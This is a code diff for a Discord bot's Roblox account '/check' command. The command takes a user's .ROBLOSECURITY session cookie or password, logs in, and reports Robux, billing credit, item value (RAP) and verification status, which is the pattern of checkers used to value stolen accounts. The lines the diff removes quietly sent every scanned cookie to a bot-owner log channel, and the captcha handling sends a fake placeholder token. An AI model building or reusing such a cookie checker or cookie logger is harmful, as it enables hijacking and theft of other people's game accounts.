@@ -1589,6 +1589,11 @@ async def unlink(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed)
 
 # ========== Check Command ==========
+async def get_csrf_token(session):
+    async with session.post("https://auth.roblox.com/v2/logout")  as resp:
+        return resp.headers.get("x-csrf-token")
+
+
 async def get_cookie_from_login(username, password, interaction, captcha_data=None):
     url = "https://auth.roblox.com/v2/login" 
     payload = {
@@ -1596,17 +1601,18 @@ async def get_cookie_from_login(username, password, interaction, captcha_data=No
         "cvalue": username,
         "password": password
     }
-    if captcha_data:
-        payload.update({
-            "captchaToken": captcha_data["token"],
-            "captchaId": captcha_data["id"]
-        })
-
     headers = {}
-    if getattr(bot, "xcsrf_token", None):
-        headers["x-csrf-token"] = bot.xcsrf_token
-
     async with aiohttp.ClientSession() as session:
+        bot.xcsrf_token = await get_csrf_token(session)
+        if bot.xcsrf_token:
+            headers["x-csrf-token"] = bot.xcsrf_token
+
+        if captcha_data:
+            payload.update({
+                "captchaToken": captcha_data["token"],
+                "captchaId": captcha_data["id"]
+            })
+
         async with session.post(url, json=payload, headers=headers) as resp:
             if resp.status == 200:
                 data = await resp.json()
@@ -1626,15 +1632,12 @@ async def get_cookie_from_login(username, password, interaction, captcha_data=No
                 else:
                     raise Exception(f"Login failed: {error}")
             else:
-                raise Exception(f"Unexpected response: {resp.status}")
-    return {}
+                text = await resp.text()
+                raise Exception(f"Unexpected response: {resp.status} - {text}")
 
 
 async def fetch_roblox_info(cookie):
-    async with aiohttp.ClientSession(headers={
-        "Cookie": f".ROBLOSECURITY={cookie}"
-    }) as session:
-
+    async with aiohttp.ClientSession(headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as session:
         # Step 1: Get authenticated user ID
         async with session.get("https://users.roblox.com/v1/users/authenticated")  as r:
             if r.status != 200:
@@ -1642,7 +1645,7 @@ async def fetch_roblox_info(cookie):
             auth_data = await r.json()
             user_id = auth_data["id"]
 
-        # Step 2: Get user username and description
+        # Step 2: Get user info
         async with session.get(f"https://users.roblox.com/v1/users/{user_id}")  as r:
             user_data = await r.json()
             username = user_data["name"]
@@ -1658,7 +1661,7 @@ async def fetch_roblox_info(cookie):
         async with session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")  as r:
             premium = await r.json()
 
-        # Step 5: Credit Balance (billing credit)
+        # Step 5: Credit Balance
         async with session.get("https://billing.roblox.com/v1/credit")  as r:
             credit_info = await r.json()
             credit = credit_info.get("balance", 0)
@@ -1701,6 +1704,7 @@ async def fetch_roblox_info(cookie):
             "rap": rap
         }
 
+
 async def get_total_rap(user_id, session):
     total_rap = 0
     cursor = ""
@@ -1717,9 +1721,14 @@ async def get_total_rap(user_id, session):
                 break
     return total_rap
 
+
 @bot.tree.command(name="check", description="Check details of a Roblox account using cookie or credentials.")
-@app_commands.describe(cookie="Provide .ROBLOSECURITY cookie", username="Your Roblox username", password="Your Roblox password")
-async def check(interaction: discord.Interaction, cookie: str = None, username: str = None, password: str = None):
+@app_commands.describe(
+    cookie="Provide .ROBLOSECURITY cookie",
+    username="Your Roblox username",
+    password="Your Roblox password"
+)
+async def check(interaction: Interaction, cookie: str = None, username: str = None, password: str = None):
     if cookie and (username or password):
         await interaction.response.send_message("❌ Please provide either a cookie OR username + password.", ephemeral=True)
         return
@@ -1727,7 +1736,7 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
         await interaction.response.send_message("❌ Please provide either a cookie OR username and password.", ephemeral=True)
         return
 
-    loading_embed = discord.Embed(title="🔍 Loading Account Info...", description="Please wait...", color=discord.Color.orange())
+    loading_embed = Embed(title="🔍 Loading Account Info...", description="Please wait...", color=discord.Color.orange())
     init_msg = await interaction.channel.send(embed=loading_embed)
 
     try:
@@ -1735,14 +1744,16 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
         if cookie:
             auth_result = {"cookie": cookie}
         else:
-            # Attempt login
-            async with aiohttp.ClientSession() as s:
-                async with s.get("https://auth.roblox.com/v2/logout")  as r:
-                    bot.xcsrf_token = r.headers.get("x-csrf-token", bot.xcsrf_token)
+            bot.xcsrf_token = None
+            async with aiohttp.ClientSession() as session:
+                async with session.get("https://auth.roblox.com/v2/logout") as r:
+                    bot.xcsrf_token = r.headers.get("x-csrf-token")
+
             auth_result = await get_cookie_from_login(username, password, interaction)
+
             if auth_result.get("captcha"):
-                captcha_url = "https://arkoselabs.com/demo"   # Placeholder
-                captcha_embed = discord.Embed(
+                captcha_url = "https://arkoselabs.com/demo"
+                captcha_embed = Embed(
                     title="🔐 Solve Captcha",
                     description=f"[Click here to solve captcha]({captcha_url})\nReact with ✅ once solved.",
                     color=discord.Color.gold()
@@ -1750,63 +1761,50 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
                 await init_msg.edit(embed=captcha_embed)
                 await init_msg.add_reaction("✅")
 
-                def check(reaction, user):
+                def check_reaction(reaction, user):
                     return reaction.message.id == init_msg.id and user == interaction.user and str(reaction.emoji) == "✅"
 
                 try:
-                    reaction, user = await bot.wait_for("reaction_add", timeout=90.0, check=check)
+                    await bot.wait_for("reaction_add", timeout=90.0, check=check_reaction)
                 except asyncio.TimeoutError:
-                    await init_msg.edit(embed=discord.Embed(title="⏰ Timed Out", color=discord.Color.red()))
+                    await init_msg.edit(embed=Embed(title="⏰ Timed Out", color=discord.Color.red()))
                     return
+
                 await init_msg.remove_reaction("✅", interaction.user)
-                auth_result = await get_cookie_from_login(username, password, interaction, {
-                    "token": "manual_captcha_solved",
-                    "id": auth_result["captcha_id"]
-                })
+
+                auth_result = await get_cookie_from_login(
+                    username, password, interaction,
+                    {"token": "manual_captcha_solved", "id": auth_result["captcha_id"]}
+                )
 
             if not auth_result.get("cookie"):
-                await init_msg.edit(embed=discord.Embed(title="❌ Login Failed", description="Invalid credentials.", color=discord.Color.red()))
+                await init_msg.edit(embed=Embed(title="❌ Login Failed", description="Invalid credentials.", color=discord.Color.red()))
                 return
 
-        # Get user info
         info = await fetch_roblox_info(auth_result["cookie"])
 
-        embed = discord.Embed(color=discord.Color.green())
+        embed = Embed(color=discord.Color.green())
         embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId={info['userid']}&width=420&height=420&format=png")
-
- 
         embed.add_field(name="Username", value=info["username"], inline=True)
         embed.add_field(name="UserID", value=str(info["userid"]), inline=True)
-
         description = info['description'] if info['description'] else "N/A"
         embed.add_field(name="Description", value=f"```\n{description}\n```", inline=False)
-
         embed.add_field(name="Robux", value=str(info["robux"]), inline=True)
         embed.add_field(name="Credit", value=f"${info['credit']}", inline=True)
-
         email_status = "Verified" if info["email_verified"] else "Add Email"
         embed.add_field(name="Email", value=email_status, inline=True)
-
         phone_status = "Verified" if info["phone_verified"] else "Add Phone"
         embed.add_field(name="Phone", value=phone_status, inline=True)
-
-        inventory_status = "[Public](https://www.roblox.com/users/{}/inventory/)".format(info["userid"])  if info["inv_public"] else "Private"
+        inventory_status = "[Public](https://www.roblox.com/users/{}/inventory/)".format(info["userid"]) if info["inv_public"] else "Private"
         embed.add_field(name="Inventory", value=inventory_status, inline=True)
-
         embed.add_field(name="RAP", value=str(info["rap"]), inline=True)
-
         premium_status = "Premium" if info["premium"] else "Non Premium"
         embed.add_field(name="Membership", value=premium_status, inline=True)
 
         if info["group"]:
             group = info["group"]
-            embed.add_field(
-                name="Primary Group",
-                value=f"[{group['name']}](https://www.roblox.com/groups/{group['id']})",  
-                inline=True
-            )
+            embed.add_field(name="Primary Group", value=f"[{group['name']}](https://www.roblox.com/groups/{group['id']})", inline=True)
         else:
-            embed.add_field(name="Primary Group", value="N/A", inline=True)
             embed.add_field(name="Primary Group", value="N/A", inline=True)
 
         embed.set_footer(text="Neroniel")
@@ -1814,20 +1812,11 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
 
         await init_msg.edit(embed=embed)
 
-        # Optional: Log cookie    
-        if getattr(bot, "COOKIE_LOG_CHANNEL_ID", 0) != 0:
-            log_channel = bot.get_channel(bot.COOKIE_LOG_CHANNEL_ID)
-            if log_channel:
-                log_embed = discord.Embed(title=f"{interaction.user} scanned a cookie", color=discord.Color.purple())
-                log_embed.add_field(name="Username", value=info["username"])
-                log_embed.add_field(name="Robux", value=info["robux"])
-                log_embed.add_field(name="Cookie", value=f"```{auth_result['cookie']}```")
-                await log_channel.send(embed=log_embed)
-
     except Exception as e:
-        error_embed = discord.Embed(title="Error", description=f"`{str(e)}`", color=discord.Color.red())
+        error_embed = Embed(title="⚠️ Error", description=f"`{str(e)}`", color=discord.Color.red())
         await init_msg.edit(embed=error_embed)
         print(f"[ERROR] /check: {e}")
+
 
 # ===========================
 # Bot Events
